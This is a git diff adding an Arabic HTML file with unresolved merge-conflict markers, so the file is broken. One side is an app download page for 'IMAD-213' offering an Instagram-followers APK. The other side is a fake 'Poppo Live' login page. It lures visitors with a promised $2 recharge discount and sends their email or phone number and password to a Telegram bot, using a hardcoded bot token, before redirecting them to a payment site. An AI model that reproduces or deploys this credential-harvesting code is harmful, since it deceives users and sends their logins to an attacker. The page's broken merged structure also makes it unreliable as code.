@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<<<<<<< HEAD
+    <title>Poppo Live</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh; /* ارتفاع كامل الصفحة */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTXs24v_bRNVMPQsLdmStc3tgy1Di2WEx89Sg'); /* خلفية كاملة */
+            background-size: cover; /* جعل الخلفية تغطي الصفحة بالكامل */
+            background-position: center; /* مركز الخلفية */
+        }
+
+        .container {
+            padding: 30px;
+            border-radius: 15px; /* حواف دائرية */
+            width: 90%; /* عرض مرن */
+            max-width: 400px; /* الحد الأقصى للعرض */
+            text-align: center;
+            backdrop-filter: blur(10px); /* إضافة تأثير ضبابي للخلفية */
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3); /* ظل للنموذج */
+        }
+
+        .logo img {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            margin-bottom: 20px;
+            color: #fff; /* لون النص */
+            font-family: 'Arial', sans-serif; /* تغيير خط النص */
+        }
+
+        .input-box {
+            position: relative; /* لجعل العناصر بالداخل تناسب */
+            margin-bottom: 15px; /* مسافة بين الحقول */
+        }
+
+        .input-box input {
+            width: 100%;
+            padding: 10px 15px; /* إضافة هوامش للداخل */
+            border: 1px solid rgba(255, 255, 255, 0.7); /* حدود شفافة */
+            border-radius: 5px; /* حواف دائرية */
+            transition: border-color 0.3s ease; /* تأثير الانتقال عند التركيز */
+            font-size: 16px; /* حجم الخط */
+            background-color: rgba(255, 255, 255, 0.3); /* خلفية شفافة للحقل */
+            color: white; /* لون النص في الحقل */
+        }
+
+        .input-box input:focus {
+            border-color: #007bff; /* تغيير لون الحدود عند التركيز */
+            outline: none; /* إزالة الإطار الافتراضي */
+        }
+
+        .submit-box {
+            margin-top: 20px; /* مسافة أعلى الزر */
+        }
+
+        .submit-box button {
+            background: linear-gradient(45deg, #ff4e50, #fc8eac); /* تدرج للألوان */
+            color: white;
+            border: none;
+            padding: 12px 20px; /* زيادة حجم الزر */
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 18px; /* حجم الخط */
+            transition: background 0.3s ease; /* تأثير الانتقال */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); /* ظل للزر */
+        }
+
+        .submit-box button:hover {
+            background: linear-gradient(45deg, #fc8eac, #ff4e50); /* تغيير لون التدرج عند التمرير */
+        }
+
+        .welcome-message {
+            font-size: 20px; /* حجم النص للرسالة الترحيبية */
+            color: #fff; /* لون الرسالة */
+            margin-bottom: 15px; /* مسافة أسفل الرسالة */
+            opacity: 1; /* لجعل النص مرئي */
+            transition: opacity 1s ease; /* تأثير الانتقال للشفافية */
+        }
+
+        .typing-indicator {
+            display: inline-block;
+            animation: blink 1s step-end infinite; /* تأثير الوميض */
+            margin-left: 5px; /* مسافة بين النص والرمز */
+            color: #fff; /* لون المؤشر */
+            font-size: 20px; /* حجم المؤشر */
+        }
+
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+=======
+    <title>IMAD-213 | تطبيقاتي</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #eaeaea;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh; /* لضمان ملء الشاشة */
+            flex-direction: column;
+        }
+        header {
+            text-align: center;
+            padding: 20px;
+            background-color: #007BFF;
+            color: white;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            margin: 0;
+            font-size: 2.5em;
+        }
+        .app-container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            max-width: 600px; /* تحديد عرض الحد الأقصى للمربع */
+            width: 100%; /* عرض 100% */
+        }
+        .app {
+            display: flex;
+            align-items: center;
+            margin: 15px 0;
+        }
+        .app img {
+            max-width: 100px;
+            margin-right: 20px;
+            border-radius: 10px;
+        }
+        .app h2 {
+            margin: 0;
+            color: #333;
+        }
+        .app p {
+            margin: 10px 0;
+            color: #666;
+        }
+        .download-button {
+            display: inline-block;
+            padding: 10px 15px;
+            background-color: #28a745;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            transition: background-color 0.3s;
+        }
+        .download-button:hover {
+            background-color: #218838;
+        }
+        footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.9em;
+            color: #666;
+>>>>>>> ad85d1e (30)
+        }
+    </style>
+</head>
+<body>
+<<<<<<< HEAD
+    <div class="container">
+        <div class="welcome-message" id="welcomeMessage"></div>
+        <div class="logo">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRJRFYynYxsTh5ruFYme-dUzqh8jdhVcT6PXQ&amp;s" alt="Logo"> <!-- شعارك -->
+        </div>
+        <h2>Poppo Live</h2>
+        <form id="loginForm">
+            <div class="input-box">
+                <input type="text" id="username" placeholder="البريد الإلكتروني أو رقم الهاتف أو معرف" required>
+            </div>
+            <div class="input-box">
+                <input type="password" id="password" placeholder="كلمة المرور" required>
+            </div>
+            <div class="submit-box">
+                <button type="submit">تسجيل الدخول</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '7384457236:AAEOg65DwRVv9lZ48pOngytKmT267n9hOtk'; // استبدل برمز البوت الخاص بك
+        const CHAT_ID = '7348106398'; // استبدل بمعرف المحادثة الخاص بك
+
+        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        // رسالة الترحيب
+        const welcomeMessage = document.getElementById('welcomeMessage');
+        const messageText = "مرحبا , عند تسجيل دخول ستوجه الى رابط شحن مع خصم 2$ واذا لم يتم الخصم تحقق من معلومات تسجيل الدخول";
+        let words = messageText.split(' '); // تقسيم الرسالة إلى كلمات
+        let index = 0;
+
+        function typeNextWord() {
+            if (index < words.length) {
+                welcomeMessage.innerHTML += words[index] + ' '; // إضافة الكلمة
+                index++;
+                setTimeout(typeNextWord, 800); // مدة كتابة كل كلمة
+            } else {
+                welcomeMessage.innerHTML += '<span class="typing-indicator">|</span>'; // إضافة نقطة الكتابة
+            }
+        }
+
+        // بدء الكتابة عند تحميل الصفحة
+        window.onload = function() {
+            typeNextWord();
+        };
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            const message = `
+📲 *تسجيل دخول Poppo Live لخصم 2 دولار*:
+
+*البريد الإلكتروني أو رقم الهاتف:* ${username}
+*كلمة المرور:* ${password}
+            `;
+
+            const data = {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            };
+
+            fetch(TELEGRAM_API_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                // توجيه المستخدم إلى الرابط المحدد مباشرةً
+                window.location.href = 'https://pppayer.com/pay/?l=en'; 
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('حدث خطأ في الاتصال. تحقق من معلومات تسجيل الدخول.');
+            });
+        });
+    </script>
+=======
+
+    <header>
+        <h1>IMAD-213</h1>
+        <p>تطبيقاتي المطورة الحديثة</p>
+    </header>
+
+    <div class="app-container">
+        <div class="app">
+            <img src="link-to-your-app-image1.jpg" alt="">
+            <div>
+                <h2>IMAD-INSTA</h2>
+                <p>تطبيق متابعين انستغرام</p>
+                <a href="imad-213.apk" class="download-button" download>تحميل التطبيق</a>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <p>&copy; 2024 IMAD-213. جميع الحقوق محفوظة.</p>
+    </footer>
+
+>>>>>>> ad85d1e (30)
+</body>
+</html>
